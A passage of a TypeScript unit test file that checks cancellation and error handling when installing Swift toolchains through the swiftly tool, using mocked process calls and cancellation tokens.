            mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });

            // Mock swiftly install to throw cancellation error
            mockUtilities.execFileStreamOutput
                .withArgs("swiftly")
                .rejects(new Error(Swiftly.cancellationMessage));

            const progressCallback = () => {};

            await expect(
                Swiftly.installToolchain("6.0.0", progressCallback, undefined, mockToken as any)
            ).to.eventually.be.rejectedWith(Swiftly.cancellationMessage);
        });

        test("installToolchain should handle cancellation without progress callback", async () => {
            mockedPlatform.setValue("darwin");

            // Mock a cancellation token that gets cancelled
            const mockToken = {
                isCancellationRequested: true,
                onCancellationRequested: () => ({ dispose: () => {} }),
            };

            // Mock swiftly install to throw cancellation error
            mockUtilities.execFileStreamOutput
                .withArgs("swiftly")
                .rejects(new Error(Swiftly.cancellationMessage));

            await expect(
                Swiftly.installToolchain("6.0.0", undefined, undefined, mockToken as any)
            ).to.eventually.be.rejectedWith(Swiftly.cancellationMessage);
        });

        test("installSwiftlyToolchainVersion should handle cancellation gracefully", async () => {
            const mockLogger = {
                info: () => {},
                error: () => {},
                warn: () => {},
                debug: () => {},
            };

            // Mock window.withProgress to simulate cancellation
            mockWindow.withProgress.callsFake(async (_options, task) => {
                const mockProgress = { report: () => {} };
                const mockToken = {
                    isCancellationRequested: true,
                    onCancellationRequested: () => ({ dispose: () => {} }),
                };

                // Simulate the task throwing a cancellation error
                try {
                    await task(mockProgress, mockToken);
                } catch (error) {
                    if ((error as Error).message.includes(Swiftly.cancellationMessage)) {
                        throw error;
                    }
                }
            });

            // Mock Swiftly.installToolchain to throw cancellation error
            mockUtilities.execFileStreamOutput
                .withArgs("swiftly")
                .rejects(new Error(Swiftly.cancellationMessage));

            const result = await installSwiftlyToolchainVersion("6.0.0", mockLogger as any, false);

            expect(result).to.be.false;
            expect(mockWindow.showErrorMessage).to.not.have.been.called;
        });

        test("installSwiftlyToolchainVersion should show error for non-cancellation errors", async () => {
            const mockLogger = {
                info: () => {},
                error: () => {},
                warn: () => {},
                debug: () => {},
            };

            // Mock window.withProgress to simulate a regular error
            mockWindow.withProgress.callsFake(async (_options, task) => {
                const mockProgress = { report: () => {} };
                const mockToken = {
                    isCancellationRequested: false,
                    onCancellationRequested: () => ({ dispose: () => {} }),
                };

                await task(mockProgress, mockToken);
            });

            // Mock Swiftly.installToolchain to throw a regular error
            mockUtilities.execFileStreamOutput
                .withArgs("swiftly")
                .rejects(new Error("Network error"));

            const result = await installSwiftlyToolchainVersion("6.0.0", mockLogger as any, false);

            expect(result).to.be.false;
            expect(mockWindow.showErrorMessage).to.have.been.calledWith(
                match("Failed to install Swift 6.0.0")
            );
        });

        test("cancellationMessage should be properly defined", () => {
            expect(Swiftly.cancellationMessage).to.equal("Installation cancelled by user");
        });
    });
});
